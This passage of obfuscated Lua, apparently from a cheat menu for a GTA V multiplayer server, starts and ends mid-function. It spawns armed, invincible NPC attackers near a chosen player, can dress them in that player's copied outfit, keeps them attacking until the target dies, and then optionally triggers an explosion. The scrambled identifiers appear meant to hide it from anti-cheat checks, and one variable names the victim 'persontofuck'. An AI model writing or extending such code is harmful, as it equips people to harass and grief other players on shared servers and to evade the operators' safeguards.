                local randx = targetloc.x + RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(50, 75)
                local randy = targetloc.y + RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(50, 75)
                local _, zcord = nlFXKkFxuKQAk.natives.GetGroundZFor_3dCoord(randx, randy, targetloc.z, 0)
                local nodepos, vec, heading = nlFXKkFxuKQAk.natives.GetClosestVehicleNodeWithHeading(randx, randy, zcord, 1, 3.0, 0)
                while not nlFXKkFxuKQAk.natives.HasModelLoaded(RfPsUKHSFWJuBEJuz.rE.LumHash(vehicle)) do
                    nlFXKkFxuKQAk.natives.RequestModel(RfPsUKHSFWJuBEJuz.rE.LumHash(vehicle))
                    RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                end
                local vehc = nlFXKkFxuKQAk.natives.CreateVehicle(RfPsUKHSFWJuBEJuz.rE.LumHash(vehicle), vec.x, vec.y, zcord, heading, true, false)
                local pedc = nlFXKkFxuKQAk.natives.CreatePedInsideVehicle(vehc, 4, characterModel, -1, true, false)
                if ped == 100 then
                    nlFXKkFxuKQAk.natives.SetPedDefaultComponentVariation(pedc)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 6, 6, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 4, 21, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 11, 15, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 8, 15, 1, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 9, 16, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 3, 15, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 1, 115, 6, 0)
                    nlFXKkFxuKQAk.natives.SetPedHeadBlendData(pedc,2,1,3,19,2,1,2,5,2,false)
                elseif ped == 101 then
                    local persontofuck = nlFXKkFxuKQAk.natives.GetPlayerPed(target)
                    local hat = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 0)
                    local hat_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 0)
                    local glasses = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 1)
                    local glasses_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 1)
                    local ear = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 2)
                    local ear_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 2)
                    local watch = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 6)
                    local watch_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 6)
                    local wrist = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 7)
                    local wrist_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 7)
                    local head_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 0)
                    local head_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 0)
                    local head_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 0)
                    local beard_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 1)
                    local beard_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 1)
                    local beard_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 1)
                    local hair_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 2)
                    local hair_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 2)
                    local hair_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 2)
                    local torso_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 3)
                    local torso_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 3)
                    local torso_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 3)
                    local legs_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 4)
                    local legs_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 4)
                    local legs_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 4)
                    local hands_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 5)
                    local hands_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 5)
                    local hands_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 5)
                    local foot_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 6)
                    local foot_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 6)
                    local foot_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 6)
                    local acc1_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 7)
                    local acc1_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 7)
                    local acc1_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 7)
                    local acc2_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 8)
                    local acc2_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 8)
                    local acc2_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 8)
                    local acc3_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 9)
                    local acc3_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 9)
                    local acc3_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 9)
                    local mask_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 10)
                    local mask_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 10)
                    local mask_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 10)
                    local aux_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 11)
                    local aux_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 11) 	
                    local aux_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 11)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 11, aux_drawable, aux_texture, aux_palette)
                elseif ped == 102 then
                    local persontofuck = nlFXKkFxuKQAk.natives.GetPlayerPed(ClonedP)
                    local hat = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 0)
                    local hat_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 0)
                    local glasses = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 1)
                    local glasses_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 1)
                    local ear = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 2)
                    local ear_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 2)
                    local watch = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 6)
                    local watch_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 6)
                    local wrist = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 7)
                    local wrist_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 7)
                    local head_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 0)
                    local head_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 0)
                    local head_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 0)
                    local beard_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 1)
                    local beard_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 1)
                    local beard_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 1)
                    local hair_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 2)
                    local hair_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 2)
                    local hair_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 2)
                    local torso_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 3)
                    local torso_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 3)
                    local torso_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 3)
                    local legs_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 4)
                    local legs_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 4)
                    local legs_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 4)
                    local hands_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 5)
                    local hands_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 5)
                    local hands_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 5)
                    local foot_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 6)
                    local foot_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 6)
                    local foot_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 6)
                    local acc1_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 7)
                    local acc1_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 7)
                    local acc1_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 7)
                    local acc2_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 8)
                    local acc2_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 8)
                    local acc2_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 8)
                    local acc3_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 9)
                    local acc3_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 9)
                    local acc3_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 9)
                    local mask_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 10)
                    local mask_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 10)
                    local mask_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 10)
                    local aux_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 11)
                    local aux_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 11) 	
                    local aux_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 11)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 11, aux_drawable, aux_texture, aux_palette)
                end
                if isgod then
                    nlFXKkFxuKQAk.natives.SetEntityInvincible(pedc, true)
                    nlFXKkFxuKQAk.natives.SetEntityInvincible(vehc, true)
                end
                nlFXKkFxuKQAk.natives.TaskVehicleDriveToCoordLongrange(pedc, vehc, targetloc.x, targetloc.y, targetloc.z, 200.0, 2883621, 5)
                nlFXKkFxuKQAk.natives.GiveWeaponToPed(pedc, RfPsUKHSFWJuBEJuz.rE.LumHash(wep), 200, false, true)
                nlFXKkFxuKQAk.natives.TaskCombatPed(pedc, targetped, 0, 16)
                nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedc, 2, true)
                nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedc, 3, false)
                nlFXKkFxuKQAk.natives.SetPedCombatAbility(pedc, 2)
                nlFXKkFxuKQAk.natives.SetPedCombatMovement(pedc, 3)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 0, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 1, 6.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 3, 0.5)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 4, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 5, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 11, 2.0)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 13, 0.01)
                nlFXKkFxuKQAk.natives.SetCombatFloat(pedc, 14, 0.01)
                nlFXKkFxuKQAk.natives.SetPedAccuracy(pedc, hitc)
                nlFXKkFxuKQAk.natives.SetPedFiringPattern(pedc, -957453492)
                RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                    while true do
                        if nlFXKkFxuKQAk.natives.IsPedDeadOrDying(targetped, 1) then
                            if not nlFXKkFxuKQAk.natives.IsPedDeadOrDying(pedc, 1) then
                                if isexploade then
                                    local finalloc = nlFXKkFxuKQAk.natives.GetEntityCoords(pedc, false)
                                    nlFXKkFxuKQAk.natives.SetEntityInvincible(pedc, false)
                                    nlFXKkFxuKQAk.natives.AddExplosion(finalloc.x, finalloc.y, finalloc.z, 2, 100000.0, true, false, 0)
                                    return
                                end
                                nlFXKkFxuKQAk.natives.ClearPedTasks(pedc)
                                nlFXKkFxuKQAk.natives.TaskVehicleDriveToCoordLongrange(pedc, vehc, -558.2048, -2869.4, 8.888, 200.0, 2883621, 5)
                                return
                            else
                                return
                            end
                        else
                            local targetloc = nlFXKkFxuKQAk.natives.GetEntityCoords(targetped, false)
                            local targetpedloc = nlFXKkFxuKQAk.natives.GetEntityCoords(pedc, false)
                            --SetNewWaypoint(targetpedloc.x, targetpedloc.y)
                            nlFXKkFxuKQAk.natives.TaskVehicleDriveToCoordLongrange(pedc, vehc, targetloc.x, targetloc.y, targetloc.z, 200.0, 2883621, 5)
                            nlFXKkFxuKQAk.natives.TaskCombatPed(pedc, targetped, 0, 16)
                            nlFXKkFxuKQAk.natives.SetPedInfiniteAmmoClip(pedc, true)
                            RfPsUKHSFWJuBEJuz.rE.LumWait(100)
                        end
                        RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                    end
                end)
            elseif method == 4 then
                local targetloc = nlFXKkFxuKQAk.natives.GetEntityCoords(targetped, false)
                local randx = targetloc.x + RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(150, 175)
                local randy = targetloc.y + RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(150, 175)
                local _, zcord = nlFXKkFxuKQAk.natives.GetGroundZFor_3dCoord(randx, randy, targetloc.z, 0)
                local nodepos, vec, heading = nlFXKkFxuKQAk.natives.GetClosestVehicleNodeWithHeading(randx, randy, zcord, 1, 3.0, 0)
                while not nlFXKkFxuKQAk.natives.HasModelLoaded(RfPsUKHSFWJuBEJuz.rE.LumHash(vehicle1)) do
                    nlFXKkFxuKQAk.natives.RequestModel(RfPsUKHSFWJuBEJuz.rE.LumHash(vehicle1))
                    RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                end
                local vehc = nlFXKkFxuKQAk.natives.CreateVehicle(RfPsUKHSFWJuBEJuz.rE.LumHash(vehicle1), vec.x, vec.y, zcord, heading, true, false)
                local peddrive = nlFXKkFxuKQAk.natives.CreatePedInsideVehicle(vehc, 4, characterModel, -1, true, false)
                local pedp1 = nlFXKkFxuKQAk.natives.CreatePedInsideVehicle(vehc, 4, characterModel, 0, true, false)
                local pedp2 = nlFXKkFxuKQAk.natives.CreatePedInsideVehicle(vehc, 4, characterModel, 1, true, false)
                local pedp3 = nlFXKkFxuKQAk.natives.CreatePedInsideVehicle(vehc, 4, characterModel, 2, true, false)
                nlFXKkFxuKQAk.natives.SetEntityInvincible(vehc, true)
                if ped == 100 then
                    nlFXKkFxuKQAk.natives.SetPedDefaultComponentVariation(peddrive)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 6, 6, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 4, 21, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 11, 15, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 8, 15, 1, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 9, 16, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 3, 15, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 1, 115, 6, 0)
                    nlFXKkFxuKQAk.natives.SetPedHeadBlendData(peddrive,2,1,3,19,2,1,2,5,2,false)

                    nlFXKkFxuKQAk.natives.SetPedDefaultComponentVariation(pedp1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 6, 6, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 4, 21, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 11, 15, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 8, 15, 1, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 9, 16, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 3, 15, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 1, 115, 6, 0)
                    nlFXKkFxuKQAk.natives.SetPedHeadBlendData(pedp1,2,1,3,19,2,1,2,5,2,false)

                    nlFXKkFxuKQAk.natives.SetPedDefaultComponentVariation(pedp2)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 6, 6, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 4, 21, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 11, 15, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 8, 15, 1, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 9, 16, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 3, 15, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp2, 1, 115, 6, 0)
                    nlFXKkFxuKQAk.natives.SetPedHeadBlendData(pedp2,2,1,3,19,2,1,2,5,2,false)

                    nlFXKkFxuKQAk.natives.SetPedDefaultComponentVariation(pedp3)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 6, 6, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 4, 21, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 11, 15, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 8, 15, 1, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 9, 16, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 3, 15, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp3, 1, 115, 6, 0)
                    nlFXKkFxuKQAk.natives.SetPedHeadBlendData(pedp3,2,1,3,19,2,1,2,5,2,false)
                elseif ped == 101 then
                    local persontofuck = nlFXKkFxuKQAk.natives.GetPlayerPed(target)
                    local hat = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 0)
                    local hat_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 0)
                    local glasses = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 1)
                    local glasses_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 1)
                    local ear = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 2)
                    local ear_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 2)
                    local watch = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 6)
                    local watch_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 6)
                    local wrist = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 7)
                    local wrist_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 7)
                    local head_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 0)
                    local head_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 0)
                    local head_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 0)
                    local beard_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 1)
                    local beard_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 1)
                    local beard_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 1)
                    local hair_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 2)
                    local hair_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 2)
                    local hair_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 2)
                    local torso_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 3)
                    local torso_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 3)
                    local torso_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 3)
                    local legs_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 4)
                    local legs_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 4)
                    local legs_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 4)
                    local hands_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 5)
                    local hands_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 5)
                    local hands_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 5)
                    local foot_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 6)
                    local foot_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 6)
                    local foot_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 6)
                    local acc1_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 7)
                    local acc1_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 7)
                    local acc1_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 7)
                    local acc2_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 8)
                    local acc2_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 8)
                    local acc2_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 8)
                    local acc3_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 9)
                    local acc3_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 9)
                    local acc3_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 9)
                    local mask_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 10)
                    local mask_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 10)
                    local mask_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 10)
                    local aux_drawable = nlFXKkFxuKQAk.natives.GetPedDrawableVariation(persontofuck, 11)
                    local aux_palette = nlFXKkFxuKQAk.natives.GetPedPaletteVariation(persontofuck, 11) 	
                    local aux_texture = nlFXKkFxuKQAk.natives.GetPedTextureVariation(persontofuck, 11)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(peddrive, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(peddrive, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(peddrive, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(peddrive, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(peddrive, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 0, head_drawable, head_texture, head_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 1, beard_drawable, beard_texture, beard_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 2, hair_drawable, hair_texture, hair_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 3, torso_drawable, torso_texture, torso_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 4, legs_drawable, legs_texture, legs_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 5, hands_drawable, hands_texture, hands_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 6, foot_drawable, foot_texture, foot_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 7, acc1_drawable, acc1_texture, acc1_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 8, acc2_drawable, acc2_texture, acc2_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 9, acc3_drawable, acc3_texture, acc3_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 10, mask_drawable, mask_texture, mask_palette)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(peddrive, 11, aux_drawable, aux_texture, aux_palette)

                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp1, 0, hat, hat_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp1, 1, glasses, glasses_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp1, 2, ear, ear_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp1, 6, watch, watch_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedPropIndex(pedp1, 7, wrist, wrist_texture, 1)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedp1, 0, head_drawable, head_texture, head_palette)
